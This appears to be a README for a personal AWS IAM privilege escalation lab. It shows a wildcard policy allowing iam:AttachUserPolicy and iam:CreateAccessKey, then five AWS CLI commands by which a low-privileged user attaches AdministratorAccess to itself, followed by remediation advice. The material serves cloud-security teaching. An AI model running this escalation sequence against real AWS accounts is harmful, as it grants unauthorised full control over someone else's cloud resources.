# 🔐 AWS IAM Privilege Escalation Lab

## 📌 Overview
This project demonstrates a real-world AWS IAM privilege escalation scenario where a low-privileged user gains full administrative access due to a misconfigured IAM policy.

The lab simulates attacker behavior, highlights security risks, and provides remediation strategies aligned with best practices.

---

## 🎯 Objectives
- Understand AWS IAM policy structure
- Identify over-permissioned IAM configurations
- Simulate privilege escalation using AWS CLI
- Learn the difference between AWS Console and API permissions
- Apply least privilege and remediation techniques

---

## 🧪 Scenario

A user (`low-priv-user`) was initially granted minimal permissions:

- `s3:ListAllMyBuckets`

A misconfigured policy was later attached:

- `iam:AttachUserPolicy`
- `iam:CreateAccessKey`
- `Resource: "*"`

This created a privilege escalation path.

---

## ⚠️ Vulnerability

The following IAM policy introduced the risk:

```json
{
  "Effect": "Allow",
  "Action": [
    "iam:AttachUserPolicy",
    "iam:CreateAccessKey"
  ],
  "Resource": "*"
}
```

### 🚨 Why this is dangerous
- Allows attaching any policy to any user
- Enables self-escalation to AdministratorAccess
- Grants full control over the AWS account

---

## 💣 Attack Simulation

### Step 1 – Create Access Key
```bash
aws iam create-access-key --user-name low-priv-user
```

### Step 2 – Configure CLI
```bash
aws configure
```

### Step 3 – Verify Identity
```bash
aws sts get-caller-identity
```

### Step 4 – Escalate Privileges
```bash
aws iam attach-user-policy \
--user-name low-priv-user \
--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Step 5 – Verify Escalation
```bash
aws iam list-attached-user-policies --user-name low-priv-user
```

✅ Result: User successfully gained **AdministratorAccess**

---

## 🔍 Key Observations
- AWS Console restrictions do not enforce real security boundaries
- CLI/API access can bypass UI limitations
- IAM permissions define actual capabilities
- Over-permissioned users are a critical security risk

---

## 🛡️ Remediation

### Key fixes:
- Remove `iam:AttachUserPolicy` from non-admin users
- Avoid wildcard permissions (`"*"` in Action/Resource)
- Apply the **Principle of Least Privilege**
- Use **explicit deny policies** for sensitive actions
- Prefer **IAM roles over long-term access keys**

---

## 🧠 Key Learnings

- IAM privilege escalation techniques
- Policy misconfiguration risks
- AWS security model (Action, Resource, Effect)
- Difference between Console and API behavior
- Importance of restricting IAM modification permissions

---

## 📂 Project Structure

```
iam-privilege-escalation-lab/
├── notes.md
├── attack-steps.md
├── remediation.md
├── insecure-policy.json
├── secure-policy.json
```

---

## 🚀 Skills Demonstrated

- AWS IAM security
- Cloud security analysis
- Privilege escalation detection
- CLI-based attack simulation
- Security remediation design

---

## 📌 Future Improvements
- Add CloudTrail detection queries
- Integrate GuardDuty findings
- Expand to IAM role-based attacks (PassRole / AssumeRole)
- Automate checks using security tools (Prowler, ScoutSuite)

---

## 👨‍💻 Author
Harsha Samarasingha

---

## ⭐ Summary
This lab demonstrates how a single misconfigured IAM permission can lead to full AWS account compromise and highlights the importance of enforcing strict IAM controls.

## updated after initial setup

## 🧪 Branch test update
This change was made in a feature branch.
